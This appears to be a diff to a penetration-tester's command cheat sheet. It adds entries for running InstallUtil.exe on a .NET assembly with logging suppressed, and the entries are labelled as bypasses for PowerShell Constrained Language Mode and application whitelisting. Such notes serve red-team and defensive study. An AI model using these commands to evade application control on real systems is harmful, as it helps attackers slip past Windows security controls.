@@ -1,2 +1,7 @@
-# Uninstall Method for CLM Bypass
+% installutil
+
+# Uninstall a .NET assembly using InstallUtil (commonly used for CLM bypass)
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U <BinaryPath>
+
+# Install a .NET assembly as a service (bypassing application whitelisting)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false <BinaryPath>
